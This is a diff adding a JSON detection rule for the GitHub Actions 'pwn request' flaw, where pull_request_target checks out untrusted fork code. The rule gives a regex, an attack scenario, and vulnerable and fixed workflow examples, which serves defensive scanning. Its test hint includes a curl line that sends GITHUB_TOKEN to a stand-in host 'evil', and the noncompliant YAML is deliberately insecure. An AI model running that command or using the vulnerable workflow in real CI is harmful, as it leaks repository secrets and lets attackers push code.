@@ -1,0 +1,30 @@
+{
+  "cwe_id": "CWE-829",
+  "name": "GitHub Actions pwn-request: pull_request_target checks out untrusted PR head",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "github actions",
+    "workflow",
+    "pull_request_target",
+    "checkout",
+    "ci",
+    "fork pr"
+  ],
+  "patterns": [
+    {
+      "lang": "yaml",
+      "confidence": "high",
+      "re": "(?s)pull_request_target[\\s\\S]{0,1000}?\\bref:\\s*['\"]?\\$\\{\\{\\s*github\\.event\\.pull_request\\.head\\.(?:sha|ref)"
+    }
+  ],
+  "attack_scenario": "A workflow triggered by pull_request_target runs with a read-write GITHUB_TOKEN and repository secrets, then checks out the fork's PR head and builds/tests it; the attacker's malicious build script or test step exfiltrates the secrets or pushes to the repo.",
+  "negative_test_hint": [
+    "open a fork PR whose build step runs \"curl -d @$GITHUB_TOKEN https://evil\" and assert the workflow never checks out or executes the PR head under the privileged pull_request_target token"
+  ],
+  "exemplar": {
+    "noncompliant": "on: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}",
+    "compliant": "on: pull_request\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4",
+    "explanation": "pull_request_target runs in the base-repo trust context (secrets + a write-scoped token) but is intended to check out only trusted base code. Explicitly checking out github.event.pull_request.head.(sha|ref) pulls attacker-controlled fork code into that privileged context - the canonical 'pwn request'. The two-signal regex requires BOTH the trigger and the untrusted-head checkout, so plain pull_request (read-only token) and base-only checkouts stay clean."
+  }
+}
